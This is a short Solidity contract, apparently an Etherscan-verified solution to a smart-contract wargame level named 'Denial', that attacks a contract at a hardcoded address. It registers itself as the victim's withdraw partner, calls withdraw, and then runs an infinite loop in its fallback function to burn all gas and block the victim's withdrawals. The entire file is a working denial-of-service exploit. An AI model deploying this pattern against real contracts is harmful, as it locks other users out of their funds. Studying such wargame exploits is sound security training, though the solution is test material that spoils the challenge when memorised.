/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address) external;
    function contractBalance() external returns(uint);
}

contract AttackDenial{
    IDenial victim = IDenial(0xf3C5079B10Df00927486F700018dBcA60181C2F6);

    event LogRemainingGas(uint);

    function attack() public {
        victim.setWithdrawPartner(address(this));
        victim.withdraw();
    }
    
    fallback() external payable {
        // emit LogRemainingGas(gasleft());
        // victim.withdraw();
        while(true) {
            
        }
    }
}